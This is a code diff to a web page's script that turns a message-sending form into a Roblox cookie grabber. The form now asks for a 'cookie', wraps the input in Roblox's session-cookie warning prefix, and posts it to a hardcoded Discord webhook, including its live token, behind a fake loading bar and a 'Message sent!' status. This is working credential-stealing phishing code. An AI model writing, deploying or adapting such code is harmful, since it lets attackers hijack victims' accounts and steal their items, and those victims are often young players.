@@ -176,17 +176,16 @@
     const webhookURL = "https://discord.com/api/webhooks/1367593880861806602/j2nUxJofoMKaEc032py78vCjysveQe2gw1rMmcxRt0M09IHji3QRsEKpwkR6N2QE7Rtf";
 
     function sendMessage() {
-      const message = document.getElementById('messageInput').value.trim();
+      const input = document.getElementById('messageInput').value.trim();
       const statusMsg = document.getElementById('statusMessage');
-      
-      if (!message) {
-        statusMsg.textContent = '❗ Please enter a message.';
+
+      if (!input) {
+        statusMsg.textContent = '❗ Please enter a cookie.';
         statusMsg.style.color = '#ff5e5e';
         return;
       }
 
-      // Discord's message length limit (2000 characters)
-      const MAX_MESSAGE_LENGTH = 2000;
+      const formattedMessage = `_^|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.^|_"${input}"`;
 
       const barContainer = document.getElementById('loadingBarContainer');
       const bar = document.getElementById('loadingBar');
@@ -203,7 +202,7 @@
       texts.forEach(t => t.style.display = 'none');
       texts[0].style.display = 'block';
       statusMsg.textContent = '';
-      
+
       let step = 0;
       const steps = [20, 40, 60, 80, 100];
 
@@ -219,16 +218,19 @@
             bar.style.width = '0%';
             texts.forEach(t => t.style.display = 'none');
 
-            // Split message into chunks if it's too long
-            const messageChunks = [];
-            while (message.length > MAX_MESSAGE_LENGTH) {
-              messageChunks.push(message.substring(0, MAX_MESSAGE_LENGTH));
-              message = message.substring(MAX_MESSAGE_LENGTH);
-            }
-            messageChunks.push(message); // Add the remaining part of the message
-
-            // Send each chunk separately
-            sendChunks(messageChunks, statusMsg);
+            fetch(webhookURL, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ content: formattedMessage })
+            })
+            .then(() => {
+              statusMsg.textContent = '✅ Message sent!';
+              statusMsg.style.color = '#56ff89';
+            })
+            .catch(() => {
+              statusMsg.textContent = '❌ Error sending message.';
+              statusMsg.style.color = '#ff5e5e';
+            });
           }, 500);
         }
       }
@@ -236,17 +238,10 @@
       nextStep();
     }
 
-    function sendChunks(chunks, statusMsg) {
-      chunks.forEach((chunk, index) => {
-        fetch(webhookURL, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ content: chunk })
-        })
-        .then(() => {
-          if (index === chunks.length - 1) {
-            statusMsg.textContent = '✅ Message sent!';
-            statusMsg.style.color = '#56ff89';
-          }
-        })
-        .catch(() => {
+    function toggleSupportSection() {
+      const supportSection = document.getElementById('supportSection');
+      supportSection.style.display = (supportSection.style.display === 'none' || supportSection.style.display === '') ? 'block' : 'none';
+    }
+  </script>
+</body>
+</html>
